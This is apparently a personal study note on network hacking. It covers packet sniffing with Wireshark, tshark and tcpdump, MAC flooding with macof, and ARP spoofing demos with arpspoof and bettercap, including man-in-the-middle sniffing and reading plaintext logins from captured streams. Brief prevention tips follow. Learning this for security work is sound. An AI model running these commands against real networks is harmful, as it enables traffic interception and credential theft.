## What is Network Hacking

- *Network hacking* is gathering info and exploiting of networks.
- Network hacking is an offensive branch of computer security related to networks hacking and the penetration of a target via the networking services or equipment.
- This include :
     - Network information gathering
     - Sniffing
     - Network Attack

## Network Footprinting

- Network hacking generally means gathering info about domain by using tools
     1. *Ping* : used for ping sweep (series of pings are sent)
     2. *traceroute* :
         - used to trace out the route taken by the certain info 
             - Ex. data packets from source to destination

## Network Sniffing

- Network sniffing is a process that involves capturing, examining, and observing data packets as they travel through a network using sniffing tools. 
- This method is frequently employed by network administrators to detect network problems, oversee bandwidth consumption, and address performance issues.

### Types of sniffing
1. *Passive Sniffing*
     - In passive sniffing the traffic is visible but it is *not altered* in any way. 
     - Passive sniffing allows *listening only*.
     - It works with *Hub* devices because hubs broadcast the message to all hosts.
     - But nowadays since Hubs are almost disappearing passive sniffing is not that much effective.
2. *Active Sniffing* 
     - In active sniffing the traffic is not only monitored but it may be *altered* in some way as determined by the attack.
     - Active sniffing is used to sniff *Switch-based* networks.

#### Sniffing networks
- Let's sniff network using *Wireshark*.
- Wireshark is :
     - referred to as *protocol analyzer* and uses only passive sniffing on network.
     - supports both live and offline analysis.
     - can be used on *Windows* and *Linux*.
     - can capture and record network traffics and save it form of *cap / pcap file*.
- Syntax : 
     - *wireshark*         (Type wireshark on kali terminal)
#### How to use Wireshark 
- Check the following links :

     2. https://www.varonis.com/blog/how-to-use-wireshark
     3. https://www.javatpoint.com/wireshark
#### Tshark
- *Tshark* is a terminal oriented version of Wireshark designed for capturing and displaying packets when an interactive user interface isn't necessary or available.
- Syntax :
     - *tshark  -i   eth0*           (after tshark i type the interface)

#### TCPdump
- *TCPdump* : is a powerful command-line packet analyzer tool that captures and displays network packets transmitted and received over a network interface.
- Syntax : 
     - *sudo tcpdump  -i   (interface)* 

### How to filter on wireshark
- On the search bar you can search for the protocol :
     - Ex.  ICMP, ARP, HTTP etc.
- Here are some filtering commands :  [[Pasted image 20240526165705.png]]
- Reference :
     1. https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
     2. https://www.stationx.net/wireshark-cheat-sheet/
### Following Streams on wireshark
- We can see the message or login info of unsecured protocols like ftp or http :
     1. First select the packet and right click on it.
     2. Then choose follow and choose your stream 
     3. Then a pop up page will appear and change the stream values to see further info.

### Exporting Data
- We can export traffic based on their type
     1. First go to file on the top bar and select export object
     2. Then choose your protocol type 
     3. Then when pop up page appears write file name and save it

## What is ARP ( Address Resolution Protocol )

- *ARP* : is a procedure for mapping a dynamic IP address to MAC address in a LAN.
- ARP is needed because computer / switches need to know both the IP address and the MAC address of destination host  before they can start network communication.

### MAC flooding
- *MAC flooding*  is a cyber attack targeting switches on a local area network (LAN). It involves sending many packets with fake MAC addresses to overflow the switch's address table (MAC table), causing it to become full and unable to process any legitimate traffic.
- Syntax :
     - *sudo macof   -i   (interface)* 
     - *macof  -i wlan0  -n 10  -d  192.168.220.140*

     3. https://www.geeksforgeeks.org/how-to-prevent-mac-flooding/

### Prevention of mac flooding
1. *Port Security* : limits the number of MAC addresses connecting to a single port on the Switch.
2. *MAC filtering* : limits the no of MAC addresses to certain extent.

## ARP Spoofing

- Devices use ARP to contact the router or gateway that enables them to connect to the Internet.
- *ARP spoofing* also known as *ARP poisoning*.
- *ARP Spoofing* : is a *man-in-the-middle* attack that allows attacker to intercept communication between network devices.
- The attack works as follows :   [[Pasted image 20240526192452.png]]

     3. https://www.youtube.com/watch?v=A7nih6SANYs  
### Demo of Arp spoofing
1. First get the mac of the router or your gateway 
     - *arp  -g*             -   on windows
2. Then we get mac of the attacking host / kali Linux 
3. Enable Ip forwarding on your kali
     - *sudo sysctl net.ipv4.ip_forward = 1*
4. Start spoofing with arp spoofing tool
     - *arpspoof  -i  interface  -t  target Ip  -r  gateway Ip*
     - *sudo arpspoof  -i  eth0  -t  192.168.1.3  -r  192.168.1.1*

### Demo using advanced tool for arp spoofing
1. Install bettercap  ( kali tool )
     - *sudo apt install bettercap*
2. Start bettercap
     - *sudo  bettercap  -iface  eth0*
3. Scan the network
     - *net.probe  on* 
     - *net.show*     =>     to see the network
4. Start arp spoofing
     - *set arp.spoof.targets  (Ip address)*
     - *arp.spoof  on* 
5. Start Mitm   
     - *net.sniff  on*  
     - *net.sniff  off*   

### Prevention methods for Arp spoofing
1. Using static ARP tables :  manually set 
2. Switch security :  some feature for ARP poisoning
3. Encryption :  not for Arp but in case of leaks
